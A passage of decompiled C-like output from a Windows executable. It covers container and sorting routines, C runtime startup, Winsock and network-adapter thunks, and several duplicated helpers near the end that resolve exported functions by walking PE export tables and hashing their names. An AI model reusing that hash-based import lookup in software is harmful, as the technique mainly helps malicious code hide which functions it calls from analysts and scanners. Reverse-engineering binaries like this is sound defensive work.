        for ( j = &v30[v27 / 0xFFFFFFFC]; j != a2; *v30 = v32 )
        {
          v32 = *--j;
          --v30;
        }
        for ( result = a2; result != &a2[v27 / 4]; ++result )
          *result = *a4;
        *(v5 + 8) += v27;
      }
    }
    else
    {
      v20 = 4 * a3;
      v21 = &a2[a3];
      if ( a2 != result )
      {
        v22 = &v21[v20 / 0xFFFFFFFC];
        do
        {
          if ( v21 )
          {
            *v21 = *v22;
            v5 = this;
          }
          ++v22;
          ++v21;
        }
        while ( v22 != result );
      }
      v23 = *(v5 + 8);
      for ( k = a3 - (v23 - a2); k; --k )
      {
        if ( v23 )
          *v23 = *a4;
        ++v23;
      }
      v25 = *(v5 + 8);
      for ( l = a2; l != v25; ++l )
        *l = *a4;
      result = (v20 + *(v5 + 8));
      *(v5 + 8) = result;
    }
  }
  else
  {
    v7 = *(this + 4);
    if ( !v7 || (v8 = (result - v7) >> 2, a3 >= v8) )
      v8 = a3;
    if ( v7 )
      v9 = (result - v7) >> 2;
    else
      v9 = 0;
    v10 = v8 + v9;
    v34 = v10;
    if ( v10 < 0 )
      v10 = 0;
    v35 = operator new(4 * v10);
    v11 = v35;
    for ( m = *(v5 + 4); m != a2; ++v11 )
    {
      if ( v11 )
        *v11 = *m;
      ++m;
    }
    v13 = v11;
    if ( a3 )
    {
      v14 = a3;
      do
      {
        if ( v13 )
        {
          *v13 = *a4;
          v5 = this;
        }
        ++v13;
        --v14;
      }
      while ( v14 );
    }
    v15 = *(v5 + 8);
    v16 = &v11[a3];
    if ( a2 != v15 )
    {
      v17 = a2;
      do
      {
        if ( v16 )
          *v16 = *v17;
        ++v17;
        ++v16;
      }
      while ( v17 != v15 );
    }
    freeBlock_4097FE(*(this + 4));
    *(this + 12) = &v35[v34];
    v18 = *(this + 4);
    if ( v18 )
    {
      v19 = *(this + 8);
      *(this + 4) = v35;
      result = &v35[a3 + ((v19 - v18) >> 2)];
    }
    else
    {
      *(this + 4) = v35;
      result = &v35[a3];
    }
    *(this + 8) = result;
  }
  return result;
}


// --- Metadata ---
// Function Name: quickSort_409680
// Address: 0x409680
// Signature: unknown_signature
// ---------------
int __cdecl quickSort_409680(char *a1, char *a2)
{
  char *v2; // ebx
  char *v3; // edi
  int result; // eax
  unsigned int v5; // ecx
  unsigned int v6; // esi
  unsigned int v7; // eax
  char *v8; // eax
  char *i; // esi
  unsigned int v10; // edx
  unsigned int v11; // edx
  unsigned int v12; // edx
  int v13; // edx
  signed int v14; // eax

  v2 = a2;
  v3 = a1;
  result = a2 - a1;
  if ( ((a2 - a1) & 0xFFFFFFFC) > 64 )
  {
    while ( 1 )
    {
      v5 = *v3;
      v6 = *(v2 - 1);
      v7 = *&v3[4 * ((result >> 2) / 2)];
      if ( *v3 < v7 )
        break;
      if ( v5 >= v6 )
      {
        v5 = *(v2 - 1);
        if ( v7 >= v6 )
          goto LABEL_8;
      }
LABEL_9:
      v8 = v2;
      for ( i = v3; ; i += 4 )
      {
        if ( *i < v5 )
        {
          do
          {
            v10 = *(i + 1);
            i += 4;
          }
          while ( v10 < v5 );
        }
        v11 = *(v8 - 1);
        v8 -= 4;
        if ( v5 < v11 )
        {
          do
          {
            v12 = *(v8 - 1);
            v8 -= 4;
          }
          while ( v5 < v12 );
        }
        if ( v8 <= i )
          break;
        v13 = *i;
        *i = *v8;
        *v8 = v13;
      }
      v14 = i - v3;
      LOBYTE(v14) = (i - v3) & 0xFC;
      if ( ((v2 - i) & 0xFFFFFFFC) > v14 )
      {
        quickSort_409680(v3, i);
        v3 = i;
      }
      else
      {
        quickSort_409680(i, v2);
        v2 = i;
      }
      result = v2 - v3;
      if ( ((v2 - v3) & 0xFFFFFFFC) <= 64 )
        return result;
    }
    if ( v7 >= v6 )
    {
      if ( v5 < v6 )
        v5 = *(v2 - 1);
      goto LABEL_9;
    }
LABEL_8:
    v5 = v7;
    goto LABEL_9;
  }
  return result;
}


// --- Metadata ---
// Function Name: insertionSort_409750
// Address: 0x409750
// Signature: unknown_signature
// ---------------
void __cdecl insertionSort_409750(unsigned int *a1, unsigned int *a2)
{
  unsigned int *i; // edi
  unsigned int v3; // esi
  unsigned int v4; // ecx
  unsigned int *v5; // eax
  unsigned int *k; // edx
  unsigned int *j; // eax
  unsigned int v8; // ecx

  if ( a1 != a2 )
  {
    for ( i = a1 + 1; i != a2; ++i )
    {
      v3 = *i;
      if ( *i < *a1 )
      {
        for ( j = i; j != a1; j[1] = v8 )
          v8 = *--j;
        *a1 = v3;
      }
      else
      {
        v4 = *(i - 1);
        v5 = i - 1;
        for ( k = i; v3 < v4; --v5 )
        {
          *k = v4;
          v4 = *(v5 - 1);
          k = v5;
        }
        *k = v3;
      }
    }
  }
}


// --- Metadata ---
// Function Name: closesocket
// Address: 0x4097B0
// Signature: unknown_signature
// ---------------
// attributes: thunk
int __stdcall closesocket(SOCKET s)
{
  return __imp_closesocket(s);
}


// --- Metadata ---
// Function Name: recv
// Address: 0x4097B6
// Signature: unknown_signature
// ---------------
// attributes: thunk
int __stdcall recv(SOCKET s, char *buf, int len, int flags)
{
  return __imp_recv(s, buf, len, flags);
}


// --- Metadata ---
// Function Name: send
// Address: 0x4097BC
// Signature: unknown_signature
// ---------------
// attributes: thunk
int __stdcall send(SOCKET s, const char *buf, int len, int flags)
{
  return __imp_send(s, buf, len, flags);
}


// --- Metadata ---
// Function Name: connect
// Address: 0x4097C2
// Signature: unknown_signature
// ---------------
// attributes: thunk
int __stdcall connect(SOCKET s, const struct sockaddr *name, int namelen)
{
  return __imp_connect(s, name, namelen);
}


// --- Metadata ---
// Function Name: socket
// Address: 0x4097C8
// Signature: unknown_signature
// ---------------
// attributes: thunk
SOCKET __stdcall socket(int af, int type, int protocol)
{
  return __imp_socket(af, type, protocol);
}


// --- Metadata ---
// Function Name: htons
// Address: 0x4097CE
// Signature: unknown_signature
// ---------------
// attributes: thunk
u_short __stdcall htons(u_short hostshort)
{
  return __imp_htons(hostshort);
}


// --- Metadata ---
// Function Name: inet_addr
// Address: 0x4097D4
// Signature: unknown_signature
// ---------------
// attributes: thunk
unsigned int __stdcall inet_addr(const char *cp)
{
  return __imp_inet_addr(cp);
}


// --- Metadata ---
// Function Name: select
// Address: 0x4097DA
// Signature: unknown_signature
// ---------------
// attributes: thunk
int __stdcall select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout)
{
  return __imp_select(nfds, readfds, writefds, exceptfds, timeout);
}


// --- Metadata ---
// Function Name: ioctlsocket
// Address: 0x4097E0
// Signature: unknown_signature
// ---------------
// attributes: thunk
int __stdcall ioctlsocket(SOCKET s, int cmd, u_long *argp)
{
  return __imp_ioctlsocket(s, cmd, argp);
}


// --- Metadata ---
// Function Name: inet_ntoa
// Address: 0x4097E6
// Signature: unknown_signature
// ---------------
// attributes: thunk
char *__stdcall inet_ntoa(struct in_addr in)
{
  return __imp_inet_ntoa(in);
}


// --- Metadata ---
// Function Name: WSAStartup
// Address: 0x4097EC
// Signature: unknown_signature
// ---------------
// attributes: thunk
int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData)
{
  return __imp_WSAStartup(wVersionRequested, lpWSAData);
}


// --- Metadata ---
// Function Name: ntohl
// Address: 0x4097F2
// Signature: unknown_signature
// ---------------
// attributes: thunk
u_long __stdcall ntohl(u_long netlong)
{
  return __imp_ntohl(netlong);
}


// --- Metadata ---
// Function Name: htonl
// Address: 0x4097F8
// Signature: unknown_signature
// ---------------
// attributes: thunk
u_long __stdcall htonl(u_long hostlong)
{
  return __imp_htonl(hostlong);
}


// --- Metadata ---
// Function Name: freeBlock_4097FE
// Address: 0x4097FE
// Signature: unknown_signature
// ---------------
void __cdecl freeBlock_4097FE(void *Block)
{
  free(Block);
}


// --- Metadata ---
// Function Name: GetPerAdapterInfo
// Address: 0x40980A
// Signature: unknown_signature
// ---------------
// attributes: thunk
DWORD __stdcall GetPerAdapterInfo(ULONG IfIndex, PIP_PER_ADAPTER_INFO pPerAdapterInfo, PULONG pOutBufLen)
{
  return __imp_GetPerAdapterInfo(IfIndex, pPerAdapterInfo, pOutBufLen);
}


// --- Metadata ---
// Function Name: GetAdaptersInfo
// Address: 0x409810
// Signature: unknown_signature
// ---------------
// attributes: thunk
ULONG __stdcall GetAdaptersInfo(PIP_ADAPTER_INFO AdapterInfo, PULONG SizePointer)
{
  return __imp_GetAdaptersInfo(AdapterInfo, SizePointer);
}


// --- Metadata ---
// Function Name: __onexit
// Address: 0x409816
// Signature: unknown_signature
// ---------------
_onexit_t __cdecl _onexit(_onexit_t Func)
{
  _onexit_t result; // eax

  if ( dword_70F898 == -1 )
    result = onexit(Func);
  else
    result = _dllonexit(Func, &dword_70F898, &dword_70F894);
  return result;
}


// --- Metadata ---
// Function Name: _atexit
// Address: 0x409842
// Signature: unknown_signature
// ---------------
int __cdecl atexit(void (__cdecl *Func)())
{
  return (_onexit(Func) != 0) - 1;
}


// --- Metadata ---
// Function Name: __alloca_probe
// Address: 0x409860
// Signature: unknown_signature
// ---------------
void __usercall _alloca_probe(unsigned int a1@<eax>, char a2)
{
  char *i; // ecx

  for ( i = &a2; a1 >= 0x1000; a1 -= 4096 )
    i -= 4096;
  __asm { retn }
}


// --- Metadata ---
// Function Name: _ftol
// Address: 0x409890
// Signature: unknown_signature
// ---------------
// attributes: thunk
signed __int64 __usercall ftol@<edx:eax>(double a1@<st0>)
{
  return _ftol(a1);
}


// --- Metadata ---
// Function Name: __allrem
// Address: 0x4098A0
// Signature: unknown_signature
// ---------------
unsigned __int64 __stdcall _allrem(unsigned __int64 a1, __int64 a2)
{
  int v2; // edi
  int v3; // eax
  unsigned __int64 v4; // rtt
  unsigned __int64 result; // rax
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // rax
  unsigned int v8; // eax
  int v9; // ecx
  bool v10; // cf
  unsigned __int64 v11; // rax

  v2 = 0;
  if ( (a1 & 0x8000000000000000ui64) != 0i64 )
  {
    v2 = 1;
    HIDWORD(a1) = -HIDWORD(a1) - (a1 != 0);
    LODWORD(a1) = -a1;
  }
  v3 = HIDWORD(a2);
  if ( a2 < 0 )
  {
    v3 = -HIDWORD(a2) - (a2 != 0);
    HIDWORD(a2) = v3;
    LODWORD(a2) = -a2;
  }
  if ( !v3 )
  {
    LODWORD(v4) = a1;
    HIDWORD(v4) = HIDWORD(a1) % a2;
    result = v4 % a2;
    if ( v2 - 1 < 0 )
      return result;
    return -result;
  }
  v6 = __PAIR64__(v3, a2);
  v7 = a1;
  do
  {
    v6 >>= 1;
    v7 >>= 1;
  }
  while ( HIDWORD(v6) );
  v8 = v7 / v6;
  v9 = HIDWORD(a2) * v8;
  v11 = a2 * v8;
  v10 = __CFADD__(v9, HIDWORD(v11));
  HIDWORD(v11) += v9;
  if ( v10 || v11 > a1 )
    v11 -= a2;
  result = v11 - a1;
  if ( v2 - 1 < 0 )
    return -result;
  return result;
}


// --- Metadata ---
// Function Name: __alldiv
// Address: 0x409960
// Signature: unknown_signature
// ---------------
int __stdcall _alldiv(unsigned __int64 a1, __int64 a2)
{
  int v2; // edi
  int v3; // eax
  unsigned __int64 v4; // rtt
  __int64 v5; // rax
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // rax
  unsigned int v8; // esi
  unsigned __int64 v9; // rax

  v2 = 0;
  if ( (a1 & 0x8000000000000000ui64) != 0i64 )
  {
    v2 = 1;
    HIDWORD(a1) = -HIDWORD(a1) - (a1 != 0);
    LODWORD(a1) = -a1;
  }
  v3 = HIDWORD(a2);
  if ( a2 < 0 )
  {
    ++v2;
    v3 = -HIDWORD(a2) - (a2 != 0);
    HIDWORD(a2) = v3;
    LODWORD(a2) = -a2;
  }
  if ( v3 )
  {
    v6 = __PAIR64__(v3, a2);
    v7 = a1;
    do
    {
      v6 >>= 1;
      v7 >>= 1;
    }
    while ( HIDWORD(v6) );
    v8 = v7 / v6;
    v9 = v8 * a2;
    if ( __CFADD__(HIDWORD(a2) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a2 * v8) >> 32, v9 > a1) )
      --v8;
    v5 = v8;
  }
  else
  {
    LODWORD(v4) = a1;
    HIDWORD(v4) = HIDWORD(a1) % a2;
    LODWORD(v5) = v4 / a2;
    HIDWORD(v5) = HIDWORD(a1) / a2;
  }
  if ( v2 == 1 )
    v5 = -v5;
  return v5;
}


// --- Metadata ---
// Function Name: __CxxFrameHandler
// Address: 0x409A0A
// Signature: unknown_signature
// ---------------
// attributes: thunk
int _CxxFrameHandler()
{
  return __CxxFrameHandler();
}


// --- Metadata ---
// Function Name: ??2@YAPAXI@Z
// Address: 0x409A10
// Signature: unknown_signature
// ---------------
// attributes: thunk
void *__cdecl operator new(unsigned int a1)
{
  return __imp_??2@YAPAXI@Z(a1);
}


// --- Metadata ---
// Function Name: start
// Address: 0x409A16
// Signature: unknown_signature
// ---------------
void __noreturn start()
{
  char *v0; // esi
  int v1; // eax
  HMODULE v2; // eax
  int v3; // [esp-4h] [ebp-88h]
  char v4[4]; // [esp+14h] [ebp-70h] BYREF
  int v5; // [esp+18h] [ebp-6Ch] BYREF
  int v6; // [esp+1Ch] [ebp-68h]
  char v7[4]; // [esp+20h] [ebp-64h] BYREF
  char v8[4]; // [esp+24h] [ebp-60h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+28h] [ebp-5Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+6Ch] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  _set_app_type(_crt_gui_app);
  dword_70F894 = -1;
  dword_70F898 = -1;
  *_p__fmode() = dword_70F88C;
  *_p__commode() = dword_70F888;
  dword_70F890 = adjust_fdiv;
  nullsub_1();
  if ( !dword_431410 )
    _setusermatherr(UserMathErrorFunction);
  _setdefaultprecision();
  initterm(&First, &Last);
  v5 = dword_70F884;
  _getmainargs(v8, v4, v7, dword_70F880, &v5);
  initterm(&dword_40B000, &dword_40B008);
  v0 = acmdln;
  if ( *acmdln != 34 )
  {
    while ( *v0 > 0x20u )
      ++v0;
    goto LABEL_8;
  }
  do
    ++v0;
  while ( *v0 && *v0 != 34 );
  if ( *v0 != 34 )
    goto LABEL_8;
  while ( 1 )
  {
    ++v0;
LABEL_8:
    if ( !*v0 || *v0 > 0x20u )
    {
      StartupInfo.dwFlags = 0;
      GetStartupInfoA(&StartupInfo);
      if ( (StartupInfo.dwFlags & 1) != 0 )
        v1 = StartupInfo.wShowWindow;
      else
        v1 = 10;
      v3 = v1;
      v2 = GetModuleHandleA(0);
      v6 = WinMain(v2, 0, v0, v3);
      exit(v6);
    }
  }
}


// --- Metadata ---
// Function Name: free
// Address: 0x409B74
// Signature: unknown_signature
// ---------------
// attributes: thunk
void __cdecl free(void *Block)
{
  __imp_free(Block);
}


// --- Metadata ---
// Function Name: __dllonexit
// Address: 0x409B7A
// Signature: unknown_signature
// ---------------
// attributes: thunk
int __cdecl _dllonexit(int a1, int a2, int a3)
{
  return __dllonexit(a1, a2, a3);
}


// --- Metadata ---
// Function Name: _XcptFilter
// Address: 0x409B80
// Signature: unknown_signature
// ---------------
// attributes: thunk
int XcptFilter()
{
  return _XcptFilter();
}


// --- Metadata ---
// Function Name: _initterm
// Address: 0x409B86
// Signature: unknown_signature
// ---------------
// attributes: thunk
void __cdecl initterm(_PVFV *First, _PVFV *Last)
{
  _initterm(First, Last);
}


// --- Metadata ---
// Function Name: __setdefaultprecision
// Address: 0x409B8C
// Signature: unknown_signature
// ---------------
unsigned int _setdefaultprecision()
{
  return controlfp(0x10000u, 0x30000u);
}


// --- Metadata ---
// Function Name: UserMathErrorFunction
// Address: 0x409B9E
// Signature: unknown_signature
// ---------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}


// --- Metadata ---
// Function Name: nullsub_1
// Address: 0x409BA1
// Signature: unknown_signature
// ---------------
void nullsub_1()
{
  ;
}


// --- Metadata ---
// Function Name: _except_handler3
// Address: 0x409BA2
// Signature: unknown_signature
// ---------------
// attributes: thunk
int except_handler3()
{
  return _except_handler3();
}


// --- Metadata ---
// Function Name: _controlfp
// Address: 0x409BA8
// Signature: unknown_signature
// ---------------
// attributes: thunk
unsigned int __cdecl controlfp(unsigned int NewValue, unsigned int Mask)
{
  return _controlfp(NewValue, Mask);
}


// --- Metadata ---
// Function Name: sub_40C020
// Address: 0x40C020
// Signature: unknown_signature
// ---------------
int __stdcall sub_40C020(int a1, int a2, int a3)
{
  if ( a2 == 1 )
    MEMORY[0x1000313C] = a1;
  return 1;
}


// --- Metadata ---
// Function Name: sub_40C15E
// Address: 0x40C15E
// Signature: unknown_signature
// ---------------
int __stdcall sub_40C15E(int a1, int a2, int a3)
{
  _DWORD *v3; // eax
  unsigned int v5; // eax
  void (**i)(void); // esi

  if ( !a2 )
  {
    if ( MEMORY[0x10003140] <= 0 )
      return 0;
    --MEMORY[0x10003140];
  }
  MEMORY[0x10003144] = *MEMORY[0x10002030];
  if ( a2 == 1 )
  {
    v3 = MEMORY[0x1000202C](128);
    MEMORY[0x1000314C] = v3;
    if ( !v3 )
      return 0;
    *v3 = 0;
    MEMORY[0x10003148] = MEMORY[0x1000314C];
    sub_40C2A6(268447744, 268447748);
    ++MEMORY[0x10003140];
  }
  else if ( !a2 )
  {
    v5 = MEMORY[0x1000314C];
    if ( MEMORY[0x1000314C] )
    {
      for ( i = (MEMORY[0x10003148] - 4); i >= v5; --i )
      {
        if ( *i )
        {
          (*i)();
          v5 = MEMORY[0x1000314C];
        }
      }
      MEMORY[0x10002024](v5);
      MEMORY[0x1000314C] = 0;
    }
  }
  return 1;
}


// --- Metadata ---
// Function Name: sub_40C2A6
// Address: 0x40C2A6
// Signature: unknown_signature
// ---------------
// attributes: thunk
int __cdecl sub_40C2A6(int a1, int a2)
{
  return MEMORY[0x10002028](a1, a2);
}


// --- Metadata ---
// Function Name: nullsub_3
// Address: 0x42C1F4
// Signature: unknown_signature
// ---------------
void nullsub_3()
{
  ;
}


// --- Metadata ---
// Function Name: sub_42C1F5
// Address: 0x42C1F5
// Signature: unknown_signature
// ---------------
int __usercall sub_42C1F5@<eax>(int a1@<eax>)
{
  int v1; // esi
  int result; // eax

  v1 = a1 + *(a1 + 60);
  if ( *v1 == 17744 )
    result = *(v1 + 120) + a1;
  else
    result = 0;
  return result;
}


// --- Metadata ---
// Function Name: sub_42C213
// Address: 0x42C213
// Signature: unknown_signature
// ---------------
int __usercall sub_42C213@<eax>(unsigned __int8 *a1@<eax>)
{
  int v2; // eax
  int result; // eax
  int v4; // ecx

  v2 = 0;
  while ( 1 )
  {
    result = 127 * v2;
    v4 = *a1;
    if ( !v4 )
      break;
    v2 = v4 + result;
    ++a1;
  }
  return result;
}


// --- Metadata ---
// Function Name: sub_42C275
// Address: 0x42C275
// Signature: unknown_signature
// ---------------
int __usercall sub_42C275@<eax>(int a1@<eax>)
{
  return *(a1 + 24);
}


// --- Metadata ---
// Function Name: sub_42C27B
// Address: 0x42C27B
// Signature: unknown_signature
// ---------------
int __usercall sub_42C27B@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>)
{
  int i; // edi
  int v5; // eax
  int v6; // ecx

  for ( i = 0; i != a3; ++i )
  {
    v5 = sub_42C213((a1 + *(a2 + 4 * i)));
    if ( v5 == v6 )
      return i;
  }
  return 0;
}


// --- Metadata ---
// Function Name: sub_42C2A3
// Address: 0x42C2A3
// Signature: unknown_signature
// ---------------
int __usercall sub_42C2A3@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return *(a2 + 28) + a1;
}


// --- Metadata ---
// Function Name: sub_42C2AB
// Address: 0x42C2AB
// Signature: unknown_signature
// ---------------
int __usercall sub_42C2AB@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return *(a2 + 32) + a1;
}


// --- Metadata ---
// Function Name: sub_42C2B3
// Address: 0x42C2B3
// Signature: unknown_signature
// ---------------
int __usercall sub_42C2B3@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return *(a2 + 36) + a1;
}


// --- Metadata ---
// Function Name: sub_42C2BB
// Address: 0x42C2BB
// Signature: unknown_signature
// ---------------
__int16 __usercall sub_42C2BB@<ax>(int a1@<eax>, int a2@<ecx>)
{
  return *(2 * a2 + a1);
}


// --- Metadata ---
// Function Name: sub_42C2C3
// Address: 0x42C2C3
// Signature: unknown_signature
// ---------------
int __usercall sub_42C2C3@<eax>(int a1@<eax>, unsigned __int16 a2@<dx>, int a3@<ecx>)
{
  return *(4 * a2 + a3) + a1;
}


// --- Metadata ---
// Function Name: sub_42CD5D
// Address: 0x42CD5D
// Signature: unknown_signature
// ---------------
int __usercall sub_42CD5D@<eax>(int a1@<eax>)
{
  int v1; // esi
  int result; // eax

  v1 = a1 + *(a1 + 60);
  if ( *v1 == 17744 )
    result = *(v1 + 120) + a1;
  else
    result = 0;
  return result;
}


// --- Metadata ---
// Function Name: sub_42CD7B
// Address: 0x42CD7B
// Signature: unknown_signature
// ---------------
int __usercall sub_42CD7B@<eax>(unsigned __int8 *a1@<eax>)
{
  int v2; // eax
  int v3; // edi
  int result; // eax
  int v5; // ecx

  v2 = 0;
  while ( 1 )
  {
    v3 = 127 * v2;
    result = 127 * v2;
    v5 = *a1;
    if ( !v5 )
      break;
    v2 = v5 + v3;
    ++a1;
  }
  return result;
}


// --- Metadata ---
// Function Name: sub_42CDDD
// Address: 0x42CDDD
// Signature: unknown_signature
// ---------------
int __usercall sub_42CDDD@<eax>(int a1@<eax>)
{
  return *(a1 + 24);
}


// --- Metadata ---
// Function Name: sub_42CDE3
// Address: 0x42CDE3
// Signature: unknown_signature
// ---------------
int __usercall sub_42CDE3@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>)
{
  int i; // edi
  int v5; // eax
  int v6; // ecx

  for ( i = 0; i != a3; ++i )
  {
    v5 = sub_42CD7B((a1 + *(a2 + 4 * i)));
    if ( v5 == v6 )
      return i;
  }
  return 0;
}


// --- Metadata ---
// Function Name: sub_42CE0B
// Address: 0x42CE0B
// Signature: unknown_signature
// ---------------
int __usercall sub_42CE0B@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return *(a2 + 28) + a1;
}


// --- Metadata ---
// Function Name: sub_42CE13
// Address: 0x42CE13
// Signature: unknown_signature
// ---------------
int __usercall sub_42CE13@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return *(a2 + 32) + a1;
}


// --- Metadata ---
// Function Name: sub_42CE1B
// Address: 0x42CE1B
// Signature: unknown_signature
// ---------------
int __usercall sub_42CE1B@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return *(a2 + 36) + a1;
}


// --- Metadata ---
// Function Name: sub_42CE23
// Address: 0x42CE23
// Signature: unknown_signature
// ---------------
__int16 __usercall sub_42CE23@<ax>(int a1@<eax>, int a2@<ecx>)
{
  return *(2 * a2 + a1);
}


// --- Metadata ---
// Function Name: sub_42CE2B
// Address: 0x42CE2B
// Signature: unknown_signature
// ---------------
int __usercall sub_42CE2B@<eax>(int a1@<eax>, unsigned __int16 a2@<dx>, int a3@<ecx>)
{
  return *(4 * a2 + a3) + a1;
}


// --- Metadata ---
// Function Name: sub_42EC08
// Address: 0x42EC08
// Signature: unknown_signature
// ---------------
int __usercall sub_42EC08@<eax>(int a1@<eax>)
{
  int v1; // esi
  int result; // eax

  v1 = a1 + *(a1 + 60);
  if ( *v1 == 17744 )
    result = *(v1 + 120) + a1;
  else
    result = 0;
  return result;
}


// --- Metadata ---
// Function Name: sub_42EC26
// Address: 0x42EC26
// Signature: unknown_signature
// ---------------
int __usercall sub_42EC26@<eax>(unsigned __int8 *a1@<eax>)
{
  int v2; // eax
  int result; // eax
  int v4; // ecx

  v2 = 0;
  while ( 1 )
  {
    result = 127 * v2;
    v4 = *a1;
    if ( !v4 )
      break;
    v2 = v4 + result;
    ++a1;
  }
  return result;
}


// --- Metadata ---
// Function Name: sub_42EC88
// Address: 0x42EC88
// Signature: unknown_signature
// ---------------
int __usercall sub_42EC88@<eax>(int a1@<eax>)
{
  return *(a1 + 24);
}


// --- Metadata ---
// Function Name: sub_42EC8E
// Address: 0x42EC8E
// Signature: unknown_signature
// ---------------
int __usercall sub_42EC8E@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>)
{
  int i; // edi
  int v5; // eax
  int v6; // ecx

  for ( i = 0; i != a3; ++i )
  {
    v5 = sub_42EC26((a1 + *(a2 + 4 * i)));
    if ( v5 == v6 )
      return i;
  }
  return -1;
}


// --- Metadata ---
// Function Name: sub_42ECB9
// Address: 0x42ECB9
// Signature: unknown_signature
// ---------------
int __usercall sub_42ECB9@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return *(a2 + 28) + a1;
}


// --- Metadata ---
// Function Name: sub_42ECC1
// Address: 0x42ECC1
// Signature: unknown_signature
// ---------------
int __usercall sub_42ECC1@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return *(a2 + 32) + a1;
}


// --- Metadata ---
// Function Name: sub_42ECC9
// Address: 0x42ECC9
// Signature: unknown_signature
// ---------------
int __usercall sub_42ECC9@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return *(a2 + 36) + a1;
}


// --- Metadata ---
// Function Name: sub_42ECD1
// Address: 0x42ECD1
// Signature: unknown_signature
// ---------------
__int16 __usercall sub_42ECD1@<ax>(int a1@<eax>, int a2@<ecx>)
{
  return *(2 * a2 + a1);
}


// --- Metadata ---
// Function Name: sub_42ECD9
// Address: 0x42ECD9
// Signature: unknown_signature
// ---------------
int __usercall sub_42ECD9@<eax>(int a1@<eax>, unsigned __int16 a2@<dx>, int a3@<ecx>)
{
  return *(4 * a2 + a3) + a1;
}


